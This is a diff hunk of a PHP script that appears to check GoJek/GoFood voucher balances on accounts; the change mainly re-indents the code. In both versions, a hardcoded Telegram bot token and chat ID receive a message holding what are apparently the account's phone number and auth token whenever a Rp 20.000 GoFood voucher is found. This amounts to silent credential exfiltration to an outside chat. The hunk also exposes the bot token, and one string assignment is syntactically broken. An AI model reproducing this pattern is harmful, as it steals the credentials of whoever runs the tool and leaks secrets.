@@ -110,17 +110,16 @@ function change(){
         $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
         $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
         $TOKEN  = "932603531:AAFg9GdZhyOSV75vdn-gmhwbQAkQnXZf8A";
-					$chatid = "978537264";
-                    if(strpos($cekvoucher, 'Voucher Rp 20.000 pakai GoFood')){
-                    $pesan 	= "$no; 
-                    $token;"
-					$method	= "sendMessage";
-					$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
-					$post = [
- 					'chat_id' => $chatid,
- 			        	'text' => $pesan
-					];
-                                        $header = [
+	$chatid = "978537264";
+        if(strpos($cekvoucher, 'Voucher Rp 20.000 pakai GoFood')){
+        $pesan 	= "$no; $token;"
+	$method	= "sendMessage";
+	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
+	$post = [
+	'chat_id' => $chatid,
+	'text' => $pesan
+	];
+	$header = [
                                         "X-Requested-With: XMLHttpRequest",
                                         "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
                                         ];
